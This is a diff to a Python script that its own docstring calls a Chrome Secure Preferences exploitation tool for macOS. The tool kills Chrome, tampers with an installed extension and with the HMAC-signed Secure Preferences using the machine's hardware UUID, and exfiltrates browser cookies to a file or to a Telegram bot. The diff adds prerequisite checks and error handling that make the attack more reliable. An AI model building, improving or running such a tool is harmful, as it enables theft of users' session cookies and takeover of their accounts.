@@ -1,4 +1,5 @@
 # flake8: noqa
+# allow-non-ascii: Existing browser templates and canonicalization literals.
 #!/usr/bin/env python3
 """
 Chrome Secure Preferences Exploitation Tool (macOS Version)
@@ -17,12 +18,15 @@ This version is optimized for macOS and handles all three steps:
 3. Restart Chrome and exfiltrate cookies via background script (locally by dumping to a file or via telegram by sending cookies to Telegram bot)
 """
 
+from __future__ import annotations
+
 import argparse
 import hashlib
 import hmac
 import json
 import os
 import re
+import stat
 import subprocess
 import sys
 import time
@@ -81,14 +85,59 @@ def check_macos():
     return True
 
 
-def kill_chrome():
-    """Kill all running Chrome processes on macOS."""
-    print("[*] Killing Chrome processes...")
-    subprocess.run(["pkill", "-a", "-i", "Google Chrome"], check=False)
+class ChromePrerequisiteError(RuntimeError):
+    def __init__(self, code: str, detail: str) -> None:
+        self.code = code
+        super().__init__(f"{code}: {detail}")
 
-    # Give Chrome time to fully close
+
+def chrome_is_running() -> bool:
+    result = subprocess.run(
+        ["pgrep", "-u", str(os.getuid()), "-x", "Google Chrome"],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.PIPE,
+        text=True,
+        timeout=10,
+        check=False,
+    )
+    if result.returncode not in (0, 1):
+        raise ChromePrerequisiteError(
+            "BROWSER_STATE_UNAVAILABLE", result.stderr.strip()
+        )
+    return result.returncode == 0
+
+
+def restore_chrome_after_prerequisite_failure() -> None:
+    print("[*] Restoring the unchanged Chrome session after prerequisite failure")
+    try:
+        if chrome_is_running():
+            return
+        subprocess.run(
+            ["open", "-a", "Google Chrome", "--args", "--restore-last-session"],
+            check=True,
+            timeout=15,
+        )
+    except (ChromePrerequisiteError, OSError, subprocess.SubprocessError) as error:
+        print(f"[!] BROWSER_RESTORE_FAILED: {error}")
+
+
+def kill_chrome() -> None:
+    """Stop Chrome and verify it stopped before allowing file changes."""
+    print("[*] Killing Chrome processes...")
+    result = subprocess.run(
+        ["pkill", "-u", str(os.getuid()), "-a", "-i", "Google Chrome"],
+        check=False,
+        timeout=10,
+    )
+    if result.returncode not in (0, 1):
+        raise ChromePrerequisiteError(
+            "BROWSER_STOP_FAILED", f"pkill exited with {result.returncode}"
+        )
+
     print("[*] Waiting 5 seconds for Chrome to fully close...")
     time.sleep(5)
+    if chrome_is_running():
+        raise ChromePrerequisiteError("BROWSER_STOP_FAILED", "Chrome is still running")
 
 
 def get_device_id():
@@ -97,6 +146,10 @@ def get_device_id():
         ["system_profiler", "SPHardwareDataType"], universal_newlines=True
     )
     found = re.search("Hardware UUID: (.*)", sid)
+    if found is None:
+        raise ChromePrerequisiteError(
+            "DEVICE_ID_UNAVAILABLE", "Hardware UUID was not reported"
+        )
     return found.group(1)
 
 
@@ -105,34 +158,121 @@ def get_chrome_user_data_dir():
     return Path.home() / "Library/Application Support/Google/Chrome"
 
 
-def find_secure_preferences_files(extension_id):
-    """Find all Secure Preferences files that contain the specified extension."""
+def _stat_path(path: Path) -> os.stat_result | None:
+    try:
+        return path.stat()
+    except FileNotFoundError:
+        return None
+    except PermissionError as error:
+        raise ChromePrerequisiteError("FILE_ACCESS_DENIED", str(path)) from error
+    except OSError as error:
+        raise ChromePrerequisiteError(
+            "PROFILE_DATA_UNREADABLE", f"{path}: {error}"
+        ) from error
+
+
+def _read_profile_json(path: Path) -> dict[str, object] | None:
+    try:
+        with open(path, encoding="utf-8") as handle:
+            data = json.load(handle)
+    except FileNotFoundError:
+        return None
+    except PermissionError as error:
+        raise ChromePrerequisiteError("FILE_ACCESS_DENIED", str(path)) from error
+    except (OSError, UnicodeDecodeError, json.JSONDecodeError) as error:
+        raise ChromePrerequisiteError(
+            "PROFILE_DATA_UNREADABLE", f"{path}: {error}"
+        ) from error
+    if not isinstance(data, dict):
+        raise ChromePrerequisiteError("INVALID_PROFILE_DATA", str(path))
+    return data
+
+
+def _profile_extension(
+    profile_dir: Path, extension_id: str
+) -> tuple[Path, Path] | None:
+    preferences = profile_dir / "Secure Preferences"
+    data = _read_profile_json(preferences)
+    if data is None:
+        return None
+    extensions = data.get("extensions", {})
+    if not isinstance(extensions, dict):
+        raise ChromePrerequisiteError("INVALID_PROFILE_DATA", str(preferences))
+    settings = extensions.get("settings", {})
+    if not isinstance(settings, dict):
+        raise ChromePrerequisiteError("INVALID_PROFILE_DATA", str(preferences))
+    entry = settings.get(extension_id)
+    if entry is None:
+        return None
+    if not isinstance(entry, dict):
+        raise ChromePrerequisiteError("INVALID_PROFILE_DATA", str(preferences))
+    ext_path = entry.get("path")
+    if ext_path is None or ext_path == "":
+        return None
+    if not isinstance(ext_path, str):
+        raise ChromePrerequisiteError("INVALID_PROFILE_DATA", str(preferences))
+    extension_dir = profile_dir / "Extensions" / ext_path
+    info = _stat_path(extension_dir)
+    if info is None or not stat.S_ISDIR(info.st_mode):
+        return None
+    if _read_profile_json(extension_dir / "manifest.json") is None:
+        return None
+    state = entry.get("state")
+    if state is not None and (type(state) is not int or state not in (0, 1)):
+        raise ChromePrerequisiteError("INVALID_PROFILE_DATA", str(preferences))
+    reasons = entry.get("disable_reasons", [])
+    if type(reasons) is int:
+        disabled = reasons != 0
+    elif isinstance(reasons, list) and all(type(reason) is int for reason in reasons):
+        disabled = any(reason != 0 for reason in reasons)
+    else:
+        raise ChromePrerequisiteError("INVALID_PROFILE_DATA", str(preferences))
+    if state == 0 or disabled:
+        raise ChromePrerequisiteError("EXTENSION_DISABLED", str(profile_dir))
+    return preferences, extension_dir
+
+
+def find_secure_preferences_files(extension_id: str) -> list[tuple[Path, Path]]:
+    """Find installed, enabled targets without hiding profile access errors."""
     chrome_dir = get_chrome_user_data_dir()
-    found_files = []
+    try:
+        profiles = sorted(chrome_dir.iterdir())
+    except FileNotFoundError as error:
+        raise ChromePrerequisiteError(
+            "EXTENSION_NOT_INSTALLED",
+            f"Chrome profile directory is absent: {chrome_dir}",
+        ) from error
+    except PermissionError as error:
+        raise ChromePrerequisiteError("FILE_ACCESS_DENIED", str(chrome_dir)) from error
+    except OSError as error:
+        raise ChromePrerequisiteError(
+            "PROFILE_DATA_UNREADABLE", f"{chrome_dir}: {error}"
+        ) from error
 
-    # Look in all profile directories
-    for profile_dir in chrome_dir.glob("*"):
-        if not profile_dir.is_dir():
+    found_files: list[tuple[Path, Path]] = []
+    disabled_profiles = []
+    for profile in profiles:
+        info = _stat_path(profile)
+        if info is None or not stat.S_ISDIR(info.st_mode):
             continue
-
-        sec_pref_file = profile_dir / "Secure Preferences"
-        if not sec_pref_file.exists():
-            continue
-
         try:
-            with open(sec_pref_file, "r", encoding="utf-8") as f:
-                data = json.load(f)
-
-            # Check if the extension exists in this profile
-            if extension_id in data.get("extensions", {}).get("settings", {}):
-                ext_path = data["extensions"]["settings"][extension_id].get("path", "")
-                if ext_path:
-                    ext_dir = profile_dir / "Extensions" / ext_path
-                    found_files.append((sec_pref_file, ext_dir))
-        except (json.JSONDecodeError, KeyError) as e:
-            print(f"[!] Error reading {sec_pref_file}: {e}")
-
-    return found_files
+            candidate = _profile_extension(profile, extension_id)
+        except ChromePrerequisiteError as error:
+            if error.code != "EXTENSION_DISABLED":
+                raise
+            disabled_profiles.append(str(profile))
+            continue
+        if candidate is not None:
+            found_files.append(candidate)
+    if found_files:
+        return found_files
+    if disabled_profiles:
+        raise ChromePrerequisiteError(
+            "EXTENSION_DISABLED", f"{extension_id} in {', '.join(disabled_profiles)}"
+        )
+    raise ChromePrerequisiteError(
+        "EXTENSION_NOT_INSTALLED", f"No installed target with ID {extension_id}"
+    )
 
 
 def create_background_script(extension_dir, args):
@@ -715,10 +855,12 @@ def launch_chrome(extension_id, wait_time=15, kill_after=False):
         return False
 
 
-def modify_chrome_files(extension_id, device_id, args):
+def modify_chrome_files(
+    extension_id, device_id, args, found_files: list[tuple[Path, Path]] | None = None
+):
     """Modify Chrome files (extension and Secure Preferences)."""
-    # Find Secure Preferences files with the specified extension
-    found_files = find_secure_preferences_files(extension_id)
+    if found_files is None:
+        found_files = find_secure_preferences_files(extension_id)
 
     if not found_files:
         print(
@@ -743,21 +885,17 @@ def modify_chrome_files(extension_id, device_id, args):
         ):
             success_count += 1
 
-    if success_count == 0:
-        print("[!] Failed to modify any files")
+    if success_count != len(found_files):
+        print(f"[!] Modified {success_count} of {len(found_files)} matching profiles")
         return False
 
     return True
 
 
-def main():
-    """Main function."""
-    # Check if running on macOS
+def main() -> int:
+    """Validate prerequisites before stopping Chrome or changing files."""
     check_macos()
-
     args = parse_arguments()
-
-    # Validate arguments
     if args.exfil_method == "telegram" and (
         not args.telegram_token or not args.telegram_chat_id
     ):
@@ -766,20 +904,51 @@ def main():
         )
         return 1
 
-    # Always kill Chrome before modifying
-    kill_chrome()
-
-    # Get device ID for HMAC calculation
-    device_id = get_device_id()
-    print(f"[*] Device ID: {device_id}")
-
-    # Modify Chrome files
-    if not modify_chrome_files(args.id, device_id, args):
+    try:
+        find_secure_preferences_files(args.id)
+        device_id = get_device_id()
+        chrome_was_running = chrome_is_running()
+    except (ChromePrerequisiteError, OSError, subprocess.SubprocessError) as error:
+        print(f"[!] Prerequisite check failed before stopping Chrome: {error}")
+        return 1
+    except KeyboardInterrupt:
+        print("[!] Prerequisite check interrupted; Chrome was not stopped")
         return 1
 
-    # Always launch Chrome after modifying
-    launch_chrome(args.id, args.wait_time, args.kill_after)
+    print(f"[*] Device ID: {device_id}")
+    modification_started = False
+    try:
+        kill_chrome()
+        found_files = find_secure_preferences_files(args.id)
+        modification_started = True
+        if not modify_chrome_files(args.id, device_id, args, found_files=found_files):
+            print(
+                "[!] MODIFICATION_FAILED: Chrome files may be partially changed. "
+                "Review and clean up the files before reopening Chrome."
+            )
+            return 1
+    except (
+        ChromePrerequisiteError,
+        OSError,
+        subprocess.SubprocessError,
+        KeyboardInterrupt,
+    ) as error:
+        if chrome_was_running and not modification_started:
+            restore_chrome_after_prerequisite_failure()
+        elif modification_started:
+            print(
+                "[!] Chrome files may be partially changed. "
+                "Review and clean up the files before reopening Chrome."
+            )
+        print(f"[!] Execution aborted: {type(error).__name__}: {error}")
+        return 1
 
+    if not launch_chrome(args.id, args.wait_time, args.kill_after):
+        print(
+            "[!] BROWSER_START_FAILED: Chrome files have been modified. "
+            "Review and clean up the files before reopening Chrome."
+        )
+        return 1
     print("[+] Operation completed successfully")
     return 0
 
